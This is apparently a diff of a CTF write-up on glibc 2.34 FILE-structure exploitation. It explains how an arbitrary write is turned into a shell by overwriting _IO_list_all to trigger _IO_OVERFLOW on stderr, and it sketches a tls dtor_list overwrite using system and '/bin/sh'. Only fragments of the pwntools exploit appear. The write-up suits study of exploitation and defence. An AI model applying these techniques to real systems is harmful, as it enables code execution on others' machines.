@@ -94,7 +94,7 @@ This is the real thing. It grants write primitive on file structure(fp) and then
 # /* 0x0074      |  0x0004 */    int _flags2;
 # /* 0x0078      |  0x0008 */    __off_t _old_offset;
 ```
-with this write primitive we control many of the pointers of fp and this can be used to gain arbitrary write primitve. And we have libc leak thus making it very easy to write anywhere in libc and  get shell.
+with this write primitive we control many of the pointers of fp and this can be used to gain arbitrary write primitve. And we have libc leak thus making it very easy to write anywhere in libc.
 
 ```c
 size_t
@@ -400,7 +400,7 @@ Listing all of the conditions-
 - fp->_IO_buf_end ->end of the write address.
 - length = fp->_IO_buf_end - fp->_IO_buf_base and this should be greater than ```want``` which is 0x78.
 - _flag |= _IO_CURRENTLY_PUTTING(so that _flags = 0x0)
-- Rest all pointers zero (less condition true less headache )
+- Rest all pointers zero
 
 
 ### Exploit
@@ -424,8 +424,12 @@ fp+=pack(0x0)
 
 io.send(fp)
 ```
+![read_syscall](../../assets/images/read_syscall.png "read_syscall")
 
-Context: After getting arbitrary write, I mindlessly went for house of apple 2 cuz why not?  I overwrote stderr with payload that I made long ago and waited for low cortisol shell,but what i recevied was high cortisol EOF.
+![backtrace](../../assets/images/backtrace.png "backtrace")
+
+
+Context: After getting ```arbitrary write```, I mindlessly went for house of apple 2 cuz why not?  I overwrote ```stderr``` with payload that I made long ago and waited for low cortisol shell,but what i recevied was high cortisol ```EOF```.
 
 I am not explaining house of apple 2. there are tons of blogs on internet and that explains better!
 well EOF is not shell so I started debugging exit_handler in gdb and reached at this code.
@@ -470,7 +474,8 @@ _IO_flush_all_lockp (int do_lock)
   return result;
 }
 ```
-My payload relied on the fact that _IO_OVERFLOW (fp, EOF) -> this should be called with fp as stderr which should be easy peasy cuz _IO_list_all is linked list that points to stderr. and then next fp traverses via _chain.But guess what i did not account for ,the new file structure which was allocated on heap.May be I did but I think, I assumed it to be placed at the end of linked list which was not the case.
+
+My payload relied on the fact that _IO_OVERFLOW (fp, EOF) -> this should be called with fp as ```stderr``` which should be easy peasy cuz ```_IO_list_all``` is linked list that is initialized to ```stderr```. and then next fp traverses via ```_chain```. But guess what i did not account for ,the new file structure which was allocated on heap.May be I did but I think, I assumed it to be placed at the end of linked list which was not the case,
 and the reason is this
 ```c
 
@@ -498,16 +503,16 @@ _IO_link_in (struct _IO_FILE_plus *fp)
 }
 libc_hidden_def (_IO_link_in)
 ```
-fopen internally calls this function _IO_link_in and fp is inserted at the head of the linked list so now __GI__IO_list_all is like ```fp->stderr->stdout->stdin->0x0``` and before exiting prevent_fsop nulls the _chain which breaks the linked list to only ```fp->0x0``` and thus EOF.
+fopen internally calls this function ```_IO_link_in``` and fp is inserted at the head of the linked list so now ```__GI__IO_list_all``` is like ```fp->stderr->stdout->stdin->0x0``` and before exiting prevent_fsop nulls the ```_chain``` which breaks the linked list to only ```fp->0x0``` and thus EOF.
 ```asm
- -> 0x79b097e9137a 488b15df821800        <_IO_link_in+0xfa>   mov    rdx, QWORD PTR [rip + 0x1882df] # 0x79b098019660 <__GI__IO_list_all>
-    0x79b097e91381 83470401              <_IO_link_in+0x101>   add    DWORD PTR [rdi + 0x4], 0x1
-    0x79b097e91385 48896f08              <_IO_link_in+0x105>   mov    QWORD PTR [rdi + 0x8], rbp
-    0x79b097e91389 48891dd0821800        <_IO_link_in+0x109>   mov    QWORD PTR [rip + 0x1882d0], rbx # 0x79b098019660 <__GI__IO_list_all>
-    0x79b097e91390 48895368              <_IO_link_in+0x110>   mov    QWORD PTR [rbx + 0x68], rdx
+0x79b097e9137a <_IO_link_in+0xfa>     mov    rdx, QWORD PTR [rip + 0x1882df] # 0x79b098019660 <__GI__IO_list_all>
+0x79b097e91381  <_IO_link_in+0x101>   add    DWORD PTR [rdi + 0x4], 0x1
+0x79b097e91385  <_IO_link_in+0x105>   mov    QWORD PTR [rdi + 0x8], rbp
+0x79b097e91389  <_IO_link_in+0x109>   mov    QWORD PTR [rip + 0x1882d0], rbx # 0x79b098019660 <__GI__IO_list_all>
+0x79b097e91390  <_IO_link_in+0x110>   mov    QWORD PTR [rbx + 0x68], rdx
 
 ```
-While debugging in gef, I found that __GI__IO_list_all is very close to _IO_2_1_stderr.
+While debugging in gef, I found that ```__GI__IO_list_all``` is very close to ```_IO_2_1_stderr```.
 ```asm
 0x79b098019660 <__GI__IO_list_all>:	0x0000633a85c90320	0x0000000000000000
 0x79b098019670:	                    0x0000000000000000	0x0000000000000000
@@ -515,7 +520,7 @@ While debugging in gef, I found that __GI__IO_list_all is very close to _IO_2_1_
 0x79b098019690 <_IO_2_1_stderr_+16>:0x0000000000000000	0x0000000000000000
 0x79b0980196a0 <_IO_2_1_stderr_+32>:0x0000000000000000	0x0000000000000000
 ```
-And with arb write primitive and libc leak, I just overwrote list_all to stderr thus calling _IO_OVERFLOW with fp as stderr
+And with arb write primitive and libc leak, I just overwrote ```__GI__IO_list_all``` to stderr thus calling ```_IO_OVERFLOW``` with fp as ```stderr```.
 and shell!!
 ```python
 from pwn import *
@@ -600,7 +605,7 @@ io.interactive()
 ```
 
 ### A better exploit?
-As libc version is 2.34, tls sections is alligned with libc sections and thus we can also overwrite dtor_list struct and get shell.I am too lazy to make exploit with this but I will just yoink the src code and disassembly and explain some stuff.
+As libc version is 2.34, tls sections is alligned with libc sections and thus we can also overwrite ```dtor_list``` struct and get shell.I am too lazy to make exploit with this but I will just yoink the src code and disassembly and explain some stuff.
 ```c
 typedef void (*dtor_func) (void *);
 
@@ -667,7 +672,7 @@ Dump of assembler code for function __GI___call_tls_dtors:
    0x0000777d6fe49e22 <+98>:	pop    rbp
    0x0000777d6fe49e23 <+99>:	ret
 ```
-while loop check is at +24,  and rbx contains negative value fs:rbx is the address of struct dtor_list.We have to null the fs:0x30(random_value) cuz then at +44 xor operation will have no effect. So overwriting func with with system<<17 and then obj with address of "bin/sh" will give the shell.
+while loop check is at +24,  and rbx contains negative value, fs:rbx is the address of struct dtor_list.We have to null the fs:0x30(random_value) cuz then at +44 xor operation will have no effect. So overwriting func with with system<<17 and then obj with address of "bin/sh" will give the shell.
 
 
 ### Aftermath
